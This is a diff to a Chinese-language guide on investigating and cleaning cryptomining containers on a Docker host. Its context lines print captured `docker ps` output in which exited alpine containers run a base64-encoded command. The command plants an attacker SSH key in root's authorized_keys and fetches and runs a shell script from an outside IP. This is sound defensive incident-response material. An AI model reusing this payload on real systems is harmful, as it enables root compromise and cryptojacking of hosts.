@@ -100,14 +100,14 @@ fd3a4ea7e1d9eba40b2a1bb887fc85c798894b23b27f5cc306130cc22c6cf6db   alpine       
 2079058fc554083300ef6277d1942404bf1318ec057d63a7af81504564e9f5d3   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash'"                                          4 weeks ago         Exited (1) 4 weeks ago                                                     funny_swirles
 b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash'"                                          7 weeks ago         Exited (1) 7 weeks ago                                                     kind_leakey
 ```
-### 注
+#### 注意：
 一般根据完整的 command 可以看到挖矿病毒执行的脚本或者命令
 
 ## 7、查看镜像
 ```bash
 [root@harbor ~]# docker images | grep alpine
 ```
-### 注
+#### 注意：
 一般情况下，挖矿的容器类型与该镜像添加的时间也接近，镜像类型也是一样的
 
 ## 8、停容器
@@ -133,3 +133,6 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
 容器的入侵途径没 ECS 方便定位，等后续学会了再补充。。。  
 不过清理容器挖矿比 ECS 还方便，查看了下 ECS 日志，只能看到部分 messages 里面存在日志，其他找不到蛛丝马迹了  
 不过可以把测试服务器的开源软件版本搜集下，搜查下 CVE 库看看是否有漏洞，如果有漏洞的话可以升级下安全版本
+
+## 12、参考
+docker挖矿：<https://blog.csdn.net/dot_life/article/details/105480202>
